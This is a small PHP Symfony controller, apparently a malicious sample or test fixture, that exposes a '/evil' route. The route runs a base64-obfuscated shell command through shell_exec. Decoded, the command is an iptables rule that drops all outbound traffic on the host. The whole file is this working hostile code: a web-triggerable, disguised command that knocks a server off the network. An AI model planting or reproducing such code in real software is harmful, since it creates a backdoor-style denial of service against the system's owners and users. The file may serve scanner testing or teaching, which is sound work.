<?php

declare(strict_types=1);

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class MaliciousController extends AbstractController
{
    /**
     * @Route("/evil", name="evil")
     */
    public function evil(): Response
    {
        shell_exec(base64_decode('aXB0YWJsZXMgLUEgT1VUUFVUIC1qIERST1A='));
        return new JsonResponse([
            'finished' => true
        ]);
    }
}
